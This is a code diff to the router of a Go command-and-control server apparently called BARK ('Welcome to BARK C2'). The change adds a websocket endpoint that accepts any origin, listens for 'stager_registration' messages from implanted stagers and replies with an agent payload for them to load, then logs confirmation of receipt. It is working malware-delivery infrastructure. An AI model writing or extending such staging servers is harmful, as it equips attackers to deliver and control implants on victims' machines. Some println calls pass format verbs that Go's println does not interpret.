@@ -1,11 +1,26 @@
 package router
 
 import (
+	"net/http"
+
+	"encoding/json"
+	"time"
+
+	"github.com/Et43/BARK/agent"
 	"github.com/Et43/BARK/config"
 	"github.com/Et43/BARK/middleware"
 	"github.com/casbin/casbin/v2"
 	"github.com/gin-gonic/gin"
+	"github.com/gorilla/websocket"
 )
+
+var upgrader = websocket.Upgrader{
+	ReadBufferSize:  1024,
+	WriteBufferSize: 1024,
+	CheckOrigin: func(r *http.Request) bool {
+		return true
+	},
+}
 
 func InitRouter(init *config.Initialization) *gin.Engine {
 	router := gin.New()
@@ -91,6 +106,71 @@ func InitRouter(init *config.Initialization) *gin.Engine {
 			"message": "Welcome to BARK C2",
 			"stats":   stats,
 		})
+	})
+
+	/*
+	* WEBSOCKET routes
+	*
+	* /ws GET - Websocket route
+	 */
+	router.GET("/ws", func(c *gin.Context) {
+		conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
+		println("Connection requested")
+		if err != nil {
+			println(err.Error())
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
+		defer conn.Close()
+
+		for {
+			_, msg, err := conn.ReadMessage()
+			if err != nil {
+				println("Error reading message: %v", err)
+				return
+			}
+
+			var message map[string]interface{}
+			if err := json.Unmarshal(msg, &message); err != nil {
+				// Not JSON, treat as plain text
+				println("Received non-JSON message: %s", string(msg))
+				continue
+			}
+
+			// Check if it's a stager registration
+			messageType, ok := message["type"].(string)
+			println("Message recieved: %v", message)
+			if ok && messageType == "stager_registration" {
+				println("Agent stager connected: %v", message["agentId"])
+
+				agentPayload := agent.GetAgentPayload()
+				// Send back the agent payload
+				payload := map[string]interface{}{
+					"type":      "agent_payload",
+					"timestamp": time.Now().Format(time.RFC3339),
+					"payload":   agentPayload,
+				}
+
+				payloadJson, _ := json.Marshal(payload)
+				if err := conn.WriteMessage(websocket.TextMessage, payloadJson); err != nil {
+					println("Error sending payload: %v", err)
+					return
+				}
+
+				println("Payload sent to agent: %v", message["agentId"])
+			} else if ok && messageType == "payload_received" {
+				println("Agent confirmed payload receipt: %v", message)
+			} else {
+				// Handle other message types
+				println("Received message: %v", message)
+
+				// Echo the message back
+				if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
+					println("Error echoing message: %v", err)
+					return
+				}
+			}
+		}
 	})
 
 	return router
